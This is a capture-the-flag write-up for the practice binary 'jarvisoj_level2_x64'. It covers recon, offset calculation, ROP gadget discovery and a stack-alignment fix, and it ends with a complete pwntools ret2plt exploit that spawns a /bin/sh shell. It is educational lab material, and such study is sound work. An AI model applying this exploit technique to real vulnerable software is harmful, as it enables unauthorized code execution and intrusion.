# jarvisoj_level2_x64 (BUUCTF)

**Category:** Binary Exploitation / pwn
**Arch:** x86-64, dynamically linked, not stripped, No PIE
**Technique:** Stack Buffer Overflow → ret2plt (`system@plt`) with a manually constructed `pop rdi; ret` argument gadget, reusing a `/bin/sh` string already present in the binary's `.data` section

---

## 1. Recon

```bash
file ./jarvis2
```

```
jarvis2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

```bash
checksec --file=jarvis2
```

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

- **64-bit** → System V AMD64 calling convention: first argument in `rdi`.
- **No canary** → no need to leak/preserve anything before overwriting the return address.
- **No PIE** → every binary address is fixed and known ahead of time, no leak required.
- **Not stripped** → full symbol table available for quick function discovery.

## 2. Symbol table — no ready-made "win" function this time

```bash
nm ./jarvis2 | grep " T "
```

```
00000000004006c4 T _fini
0000000000400488 T _init
00000000004006c0 T __libc_csu_fini
0000000000400650 T __libc_csu_init
0000000000400620 T main
0000000000400500 T _start
00000000004005f6 T vulnerable_function
```

Unlike the earlier `ret2text` challenge (which had an explicit `backdoor` function), here only `main` and a suggestively named `vulnerable_function` exist — no shell-granting function is handed to us directly. The exploit has to be assembled from available building blocks.

## 3. Disassembling `vulnerable_function`

```bash
objdump -d ./jarvis2 --disassemble=vulnerable_function
```

```asm
00000000004005f6 <vulnerable_function>:
  4005f7: 48 89 e5             mov    %rsp,%rbp
  4005fa: 48 83 c4 80          add    $0xffffffffffffff80,%rsp   ; i.e. sub $0x80,%rsp
  4005fe: bf d4 06 40 00       mov    $0x4006d4,%edi
  400603: e8 b8 fe ff ff       call   4004c0 <system@plt>
  400608: 48 8d 45 80          lea    -0x80(%rbp),%rax
  40060c: ba 00 02 00 00       mov    $0x200,%edx
  400611: 48 89 c6             mov    %rax,%rsi
  400614: bf 00 00 00 00       mov    $0x0,%edi
  400619: e8 b2 fe ff ff       call   4004d0 <read@plt>
  40061e: c9                   leave
  40061f: c3                   ret
```

Two things stand out:

**A deliberate-looking but ultimately incidental `system()` call happens first**, unconditionally, before any user input is even read:

```bash
objdump -s -j .rodata ./jarvis2
```

```
4006d0 01000200 6563686f 20496e70 75743a00  ....echo Input:.
```

The string at `0x4006d4` is `"echo Input:"`. So the first line is simply `system("echo Input:")` — a roundabout (and expensive) way of printing a prompt instead of using `printf`/`puts`. It turns out to matter for the exploit, though — see section 5.

**The actual bug** is a classic bounded-but-mismatched read:

```
buf = rbp - 0x80        (128-byte reserved stack space)
read(0, buf, 0x200)      (up to 512 bytes allowed)
```

128 bytes of real space, 512 bytes permitted — the same overflow pattern seen in earlier challenges where the read bound exceeds the destination buffer's actual size.

## 4. Offset calculation

`vulnerable_function` has a saved frame pointer (`mov %rsp,%rbp`), so:

```
padding = 0x80 (reserved space) + 8 (saved rbp)
        = 128 + 8
        = 136 bytes
```

## 5. No ready-made shell — building the primitive by hand

No `system("/bin/sh")` or `backdoor()`-style function exists in this binary. However, two useful facts were discovered:

**`system@plt` is already resolved.** Because `vulnerable_function` calls `system("echo Input:")` unconditionally before the vulnerable `read()`, the PLT/GOT entry for `system` is guaranteed to have already been resolved to its real address by the time our overflow executes — removing any uncertainty around lazy binding that a from-scratch `ret2libc` attack would normally need to account for.

**A `/bin/sh` string already exists in the binary**, even though nothing in the source ever references it:

```bash
strings ./jarvis2 | grep "/bin/sh"
```
```
/bin/sh
```

```bash
strings -t x ./jarvis2 | grep "/bin/sh"
```
```
a90 /bin/sh
```

`-t x` reports the string's **file offset** in hex, not a runtime address — these aren't automatically the same thing, and the translation between them depends on which section the offset falls into and that section's load address.

### Translating file offset → runtime address

```bash
readelf -S ./jarvis2
```

Relevant rows:

```
[24] .data    PROGBITS   0000000000600a80   00000a80
     0000000000000018
[25] .bss     NOBITS     0000000000600a98   00000a98
```

`.data` spans file offsets `0xa80`–`0xa98`, which contains our target offset `0xa90`. (The string unusually lives in `.data` rather than `.rodata`, likely leftover from how the compiler/linker placed it — irrelevant to exploitation since No PIE makes any fixed address equally usable.)

```
relative offset = 0xa90 - 0xa80 = 0x10
runtime address  = section base (0x600a80) + 0x10 = 0x600a90
```

`binsh_addr = 0x600a90`

### Finding an argument-setting gadget

```bash
ROPgadget --binary ./jarvis2 --only "pop|ret" | grep rdi
```
```
0x00000000004006b3 : pop rdi ; ret
```

This lets the overflow place `/bin/sh`'s address into `rdi` — the first-argument register under the System V AMD64 ABI — immediately before redirecting into `system@plt`.

## 6. First attempt — immediate SIGSEGV (stack alignment)

```python
payload  = b"A" * 136
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_plt)
```

Running this crashed with `SIGSEGV` before any output was received — the signature of a 64-bit stack-alignment fault rather than a wrong address or offset (which would typically crash on an obviously invalid address instead). As established in the earlier `ret2text` challenge, returning into a function via `ret` instead of a proper `call` can leave the stack 8 bytes off the 16-byte boundary the System V AMD64 ABI expects, which certain libc-internal code paths (e.g. `movaps`-based instructions) fault on.

### Fix — a standalone `ret` gadget to restore alignment

```bash
ROPgadget --binary ./jarvis2 --only "ret"
```

Prepending the resulting gadget's address consumes exactly 8 extra bytes of stack, restoring 16-byte alignment before `system@plt` executes:

```python
payload  = b"A" * 136
payload += p64(ret_gadget)     # alignment-only, discarded by the CPU
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_plt)
```

This resolved the crash and produced a working shell.

## 7. Full exploit

```python
from pwn import *

context.arch = 'amd64'

p = process('./jarvis2')
# p = remote('<host>', <port>)

ret_gadget  = 0x4006b4   # standalone `ret`, found via ROPgadget --only "ret"
pop_rdi     = 0x4006b3   # pop rdi ; ret
binsh_addr  = 0x600a90   # "/bin/sh" in .data
system_plt  = 0x4004c0

payload  = b"A" * 136
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_plt)

p.sendline(payload)
p.interactive()
```

```
Input:
$ id
uid=1000(Gantosay) gid=1000(Gantosay) ...
```

## 8. Reconstructed C

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function(void)
{
    char buf[128];

    system("echo Input:");   // unusual choice of prompt, but resolves system@plt early
    read(0, buf, 0x200);     // bug: allows up to 512 bytes into a 128-byte buffer
}

int main(void)
{
    vulnerable_function();
    return 0;
}
```

The `/bin/sh` string compiled into `.data` is never referenced anywhere in this source — it exists purely as a static string the compiler kept around, plausibly a leftover from an earlier draft of the challenge or deliberately left in by the author as a convenience for whoever solves it. Its presence, combined with `nm` revealing no other symbol table, was the deciding factor that made a straightforward `ret2plt` + manual `pop rdi` chain the practical solution path, as opposed to a full `ret2libc` requiring a leaked libc base address.

## 9. Tools used

| Tool | Purpose |
|---|---|
| `file` | Identify architecture, linking type, strip status |
| `checksec` | Check canary / NX / PIE / RELRO |
| `nm` | Search the symbol table; confirm no ready-made shell function exists |
| `objdump -d` | Disassemble `vulnerable_function`, locate the bug and the incidental `system()` call |
| `objdump -s -j .rodata` | Read the `"echo Input:"` prompt string |
| `strings -t x` | Locate the `/bin/sh` string's file offset |
| `readelf -S` | Map the file offset of `/bin/sh` to its runtime virtual address via section headers |
| `ROPgadget` | Locate `pop rdi ; ret` and a standalone `ret` (alignment) gadget |
| `pwntools` | Build and send the final exploit |

## 10. Key takeaways

- **A function being called incidentally, for an unrelated purpose, can still leave useful side effects** — here, `system("echo Input:")` being called at all guarantees `system@plt` is fully resolved before the overflow ever happens, sidestepping any lazy-binding uncertainty a `ret2libc` attack would otherwise need to handle.
- **Translating a `strings` file offset into a runtime address requires locating which ELF section the offset falls in and adding the difference to that section's load address** — the two numbers are not interchangeable in general, even on a No-PIE binary.
- **A useful string (like `/bin/sh`) sometimes already exists in a binary with no code path referencing it**, purely as compiled-in static data — always worth checking with `strings` before assuming one has to be written manually or pulled from libc.
- **64-bit stack alignment faults manifest as an immediate SIGSEGV with no partial output**, distinguishing them from a wrong-address crash (which more often lands partway through execution or on an obviously invalid pointer). A standalone `ret` gadget prepended to the chain is the standard fix.
